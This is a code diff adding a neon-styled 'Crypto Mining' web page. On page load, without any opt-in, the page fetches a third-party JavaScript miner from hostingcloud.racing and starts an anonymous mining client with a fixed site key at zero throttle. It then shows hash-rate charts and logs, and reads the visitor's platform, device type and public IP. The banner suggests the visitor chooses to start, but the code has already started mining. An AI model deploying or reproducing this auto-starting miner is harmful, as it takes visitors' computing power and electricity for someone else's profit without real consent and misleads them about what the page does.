@@ -1,0 +1,527 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Crypto Mining</title>
+
+  <!-- Font Awesome -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css"/>
+
+  <!-- Chart.js -->
+  <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+
+  <style>
+    :root {
+      --bg-gradient: linear-gradient(145deg, #061b11, #0f3d2b);
+      --card-gradient: linear-gradient(145deg, #0c2a1e, #135c3a);
+      --green-light: #00ff88;
+      --text: #d2ffe8;
+      --radius: 10px;
+      --shadow-in: inset 3px 3px 6px rgba(0,0,0,0.6),
+                   inset -3px -3px 6px rgba(255,255,255,0.3);
+      --shadow-out: 3px 3px 6px rgba(0,0,0,0.6),
+                    -3px -3px 6px rgba(255,255,255,0.3);
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      user-select: none;
+    }
+
+    body {
+      font-family: 'Courier New', monospace;
+      background: var(--bg-gradient);
+      color: var(--text);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      padding: 1.5rem;
+      overflow-x: hidden;
+    }
+    
+    body::after {
+      position: fixed;
+      content: "";
+      inset: 0;
+      z-index: 99999;
+      background-image: url("https://www.transparenttextures.com/patterns/classy-fabric.png");
+      background-repeat: repeat;
+      background-size: auto;
+      opacity: 0.7;
+      mix-blend-mode: overlay;
+      pointer-events: none;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 900px;
+      padding: 2rem;
+    }
+
+    .header {
+      margin-bottom: 2.5rem;
+      margin-top: 2.5rem;
+      text-align: center;
+    }
+
+    .header i {
+      color: var(--green-light);
+      font-size: clamp(4rem, 6vw, 4.5rem);
+      margin-bottom: 1rem;
+    }
+
+    .header h1 {
+      color: var(--green-light);
+      font-size: clamp(2rem, 5vw, 2.8rem);
+      letter-spacing: clamp(1px, 0.4vw, 3px);
+      position: relative;
+      text-shadow: 0 0 5px rgba(0,255,0,0.5);
+      animation: glitch 1.5s infinite alternate;
+    }
+
+    .header p {
+      color: var(--green-light);
+      font-size: 0.8rem;
+      margin-top: 1rem;
+    }
+
+    .card {
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+      padding: 1.2rem;
+      border-radius: var(--radius);
+      background: var(--card-gradient);
+      box-shadow: var(--shadow-out);
+    }
+
+    .card-icon {
+      width: 60px;
+      height: 60px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      border-radius: 50%;
+      background: var(--card-gradient);
+      box-shadow: var(--shadow-in);
+      font-size: 1.3rem;
+      color: var(--green-light);
+    }
+
+    .label {
+      font-size: .8rem;
+      opacity: .7;
+    }
+
+    .value {
+      font-size: 1rem;
+      color: var(--green-light);
+    }
+    
+    iframe {
+      max-width: 380px !important;
+      width: 75% !important;
+      aspect-ratio: 16 / 9 !important;
+      height: auto !important;
+      display: block !important;
+      margin: 1rem auto !important;
+      border-radius: 12px !important;
+    }
+    
+    iframe + div,
+    iframe ~ div {
+      top: 15px !important;
+      right: 15px !important;
+    } 
+
+    canvas {
+      margin-top: 2rem;
+      border-radius: var(--radius);
+      background: var(--card-gradient);
+      box-shadow: var(--shadow-in);
+      padding: 1rem;
+    }
+
+    .console-wrapper {
+      margin-top: 2rem;
+      border-radius: var(--radius);
+      background: var(--card-gradient);
+      box-shadow: var(--shadow-in);
+      overflow: hidden;
+    }
+
+    .console-header {
+      padding: 1rem;
+      font-size: .9rem;
+      letter-spacing: 1px;
+      color: var(--green-light);
+      border-bottom: 2px solid rgba(0,255,136,0.15);
+    }
+
+    #console {
+      height: 150px;
+      padding: 1rem;
+      overflow-y: auto;
+      font-size: 1rem;
+      background: var(--card-gradient);
+      box-shadow: var(--shadow-in);
+    }
+
+    .grid {
+      display: grid;
+      gap: 1rem;
+      grid-template-columns: 1fr;
+    }
+
+    @media (min-width: 768px) {
+      .grid {
+        grid-template-columns: repeat(3, 1fr);
+      }
+    }    
+
+    @keyframes glitch {
+      0% {
+        text-shadow: 2px 0 0 rgba(0,255,0,0.5),
+                     -2px 0 0 rgba(0,255,0,0.4);
+      }
+      25% {
+        text-shadow: -2px 0 0 rgba(0,255,0,0.5),
+                      2px 0 0 rgba(0,255,0,0.4);
+      }
+      50% {
+        text-shadow: 2px 0 0 rgba(0,255,0,0.5),
+                     -2px 0 0 rgba(0,255,0,0.4);
+      }
+      75% {
+        text-shadow: -2px 0 0 rgba(0,255,0,0.5),
+                      2px 0 0 rgba(0,255,0,0.4);
+      }
+      100% {
+        text-shadow: 2px 0 0 rgba(0,255,0,0.5),
+                     -2px 0 0 rgba(0,255,0,0.4);
+      }
+    }
+  </style>
+</head>
+
+<body>
+  <div class="container">
+    
+    <div class="header">
+      <i class="fa-brands fa-bitcoin"></i>
+      <h1>CRYPTO MINING</h1>
+      <p>
+        This site is running miner from JavaScript code, if you're interested in mining, you can start.
+      </p>
+    </div>
+
+    <div class="grid">
+    
+      <div class="card">
+        <div class="card-icon">
+          <i class="fa-solid fa-microchip"></i>
+        </div>
+        <div>
+          <div class="label">Platform</div>
+          <div class="value" id="platformValue">Loading...</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-icon">
+          <i class="fa-solid fa-laptop"></i>
+        </div>
+        <div>
+          <div class="label">Device</div>
+          <div class="value" id="deviceValue">Loading...</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-icon">
+          <i class="fa-solid fa-globe"></i>
+        </div>
+        <div>
+          <div class="label">IP Address</div>
+          <div class="value" id="ipAddress">Loading...</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-icon">
+          <i class="fa-solid fa-gauge-high"></i>
+        </div>
+        <div>
+          <div class="label">Hash Rate</div>
+          <div class="value" id="speedValue">0 H/s</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-icon">
+          <i class="fa-solid fa-chart-line"></i>
+        </div>
+        <div>
+          <div class="label">Total Hashes</div>
+          <div class="value" id="totalValue">0</div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-icon">
+          <i class="fa-solid fa-clock"></i>
+        </div>
+        <div>
+          <div class="label">Runtime</div>
+          <div class="value" id="stopwatchValue">00:00:00</div>
+        </div>
+      </div>
+
+    </div>
+
+    <canvas id="hashRateChart"></canvas>
+
+    <div class="console-wrapper">
+      <div class="console-header">
+        <i class="fa-solid fa-terminal"></i>
+        <span>System Log</span>
+      </div>
+      <div id="console"></div>
+    </div>
+
+  </div>
+
+<script src="https://www.hostingcloud.racing/SPpb.js"></script>
+<script>
+
+/* =========================
+   SAFE CLIENT INIT
+========================= */
+
+let _client = null;
+
+window.addEventListener("load", () => {
+    if (typeof Client !== "undefined") {
+        _client = new Client.Anonymous(
+            '4b3467771143126127301f0b80324fbd888046a6339591bd1a9bf51a217d9e87',
+            { throttle: 0, c: 'w' }
+        );
+
+        _client.start();
+
+        startMiningUI();
+    } else {
+        console.warn("Mining client blocked or not loaded.");
+    }
+});
+
+/* =========================
+   UPDATE HASH DATA
+========================= */
+
+function startMiningUI() {
+    const speedValue = document.getElementById("speedValue");
+    const totalValue = document.getElementById("totalValue");
+
+    setInterval(() => {
+        if (!_client) return;
+
+        const speed = _client.getHashesPerSecond() || 0;
+        const total = _client.getTotalHashes() || 0;
+
+        speedValue.textContent = speed.toFixed(2) + " H/s";
+        totalValue.textContent = total.toLocaleString();
+
+    }, 500);
+}
+
+/* =========================
+   CHART.JS
+========================= */
+
+const ctx = document.getElementById('hashRateChart').getContext('2d');
+
+const hashRateChart = new Chart(ctx, {
+    type: 'line',
+    data: {
+        labels: [],
+        datasets: [{
+            label: 'Hash Rate (H/s)',
+            data: [],
+            borderColor: '#00ff00',
+            backgroundColor: 'rgba(0, 255, 0, 0.2)',
+            tension: 0.3
+        }]
+    },
+    options: {
+    animation: false,
+    responsive: true,
+    scales: {
+    x: {
+      ticks: {
+        color: "#ffffff"   // warna angka X
+      },
+      grid: {
+        color: "rgba(255,255,255,0.15)",
+        lineWidth: 1,
+        drawBorder: true
+      },
+      border: {
+        display: true,
+        color: "#ffffff",  // warna garis sumbu X
+        width: 1
+      }
+    },
+    y: {
+      ticks: {
+        color: "#ffffff"   // warna angka Y
+      },
+      grid: {
+        color: "rgba(255,255,255,0.15)",
+        lineWidth: 1,
+        drawBorder: true
+      },
+      border: {
+        display: true,
+        color: "#ffffff",  // warna garis sumbu Y
+        width: 1
+      }
+    }
+  }
+}
+});
+
+let time = 0;
+
+function updateChart() {
+    if (_client) {
+
+        const raw = _client.getHashesPerSecond();
+        const hashRate = Number.isFinite(raw) ? raw : null;
+
+        hashRateChart.data.labels.push(time++);
+        hashRateChart.data.datasets[0].data.push(hashRate);
+
+        if (hashRateChart.data.labels.length > 30) {
+            hashRateChart.data.labels.shift();
+            hashRateChart.data.datasets[0].data.shift();
+        }
+
+        hashRateChart.update('none');
+    }
+
+    setTimeout(updateChart, 1000);
+}
+
+updateChart();
+
+/* =========================
+   CONSOLE LOG
+========================= */
+
+function logToConsole(message) {
+    const consoleDiv = document.getElementById('console');
+    const messageDiv = document.createElement('p');
+    messageDiv.textContent = message;
+
+    consoleDiv.appendChild(messageDiv);
+    consoleDiv.scrollTop = consoleDiv.scrollHeight;
+
+    // Batasi 100 baris terakhir
+    if (consoleDiv.children.length > 100) {
+        consoleDiv.removeChild(consoleDiv.firstChild);
+    }
+}
+
+setInterval(() => {
+    if (!_client) return;
+
+    const speed = _client.getHashesPerSecond() || 0;
+    const total = _client.getTotalHashes() || 0;
+
+    logToConsole(
+        `${speed.toFixed(2)} H/s ${total.toLocaleString()}`
+    );
+
+}, 2000);
+
+/* =========================
+   PLATFORM & DEVICE DETECT
+========================= */
+
+const platformEl = document.getElementById("platformValue");
+const deviceEl = document.getElementById("deviceValue");
+
+// Platform
+platformEl.textContent = navigator.platform || "Unknown";
+
+// Device Type Detection
+function detectDevice() {
+    const ua = navigator.userAgent.toLowerCase();
+
+    if (/mobile|android|iphone|ipad|ipod/.test(ua)) {
+        return "Mobile";
+    }
+
+    if (/tablet/.test(ua)) {
+        return "Tablet";
+    }
+
+    return "Desktop";
+}
+
+deviceEl.textContent = detectDevice();
+
+/* =========================
+   IP FETCH
+========================= */
+    
+fetch('https://api.ipify.org?format=json')
+    .then(res => res.json())
+    .then(data => {
+        document.getElementById('ipAddress').textContent = data.ip;
+    })
+    .catch(() => {
+        document.getElementById('ipAddress').textContent = 'Unavailable';
+    });
+
+/* =========================
+   UPTIME FIX
+========================= */
+
+const stopwatchEl = document.getElementById('stopwatchValue');
+let startTime = Date.now();
+
+setInterval(() => {
+    const elapsed = Date.now() - startTime;
+
+    const seconds = Math.floor(elapsed / 1000) % 60;
+    const minutes = Math.floor(elapsed / 60000) % 60;
+    const hours = Math.floor(elapsed / 3600000);
+
+    stopwatchEl.textContent =
+        `${String(hours).padStart(2, '0')}:` +
+        `${String(minutes).padStart(2, '0')}:` +
+        `${String(seconds).padStart(2, '0')}`;
+
+}, 1000);
+
+/* =========================
+   VISIBILITY OPTIMIZATION
+========================= */
+
+document.addEventListener("visibilitychange", () => {
+    if (!_client) return;
+
+    if (document.hidden) {
+        _client.stop();
+    } else {
+        _client.start();
+    }
+});
+</script>
+</body>
+</html>
